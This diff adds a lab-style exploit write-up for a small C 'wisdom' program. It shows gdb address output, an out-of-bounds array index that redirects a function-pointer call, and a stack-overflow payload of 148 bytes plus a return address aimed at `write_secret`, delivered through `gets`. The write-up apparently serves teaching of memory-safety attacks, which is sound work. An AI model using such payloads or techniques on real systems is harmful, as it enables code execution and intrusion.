@@ -1,0 +1,33 @@
+1. One exploit is to pass a value to `buf` in main, so instead of executing a function pointer stored in `ptrs`, it executes the function poitned by `p`.  
+
+The address of ptrs is 0x804a0d4
+The address of p (on the stack) is 0xbffff534
+
+- Using gdb we can see it addresses: 
+(gdb) print &ptrs
+$2 = (fptr (*)[3]) 0x804a0d4
+(gdb) print &p
+$5 = (fptr *) 0xbffff534
+
+
+Since the executable is compiled without aslr, we can try to enter a value that would index `ptrs` that many bytes so it ends up accessing `p` and getting the address of `pat_on_back` stored there. The math is the following:
+
+0xbffff534 - 0x804a0d4 = 0xb7fb540
+Since `ptrs` is a function pointer, it is indexed in 4B, so 0xb7fb540 / 4 = 0x2dfed518 (771675416 in decimal). And that is the vaue we should enter instead of a valid Selection.
+
+
+1. Another exploit is to overwrite the buffer `wis` in function `put_wisdom`, while executing ` r = (int)gets(wis);` when selecting 2 (Add wisdom)
+
+The goal is to execute the function write_secret.
+- Using gdb we can see it address: 
+$(gdb) print write_secret
+$3 = {void (void)} 0x8048534 <write_secret>
+
+
+To overflow the bufer `wis` and overwrite %eip with &write_secret, we need to enter the following sequence ('A' can be exchanged with any oder character, but we have to enter 148 of them to overwrite the stack until we reach `%eip`):
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x08
+
+Using gdb we can pritn out the stack and see that 148 bytes are needed to reach `%eip` from `wis`.
+
+
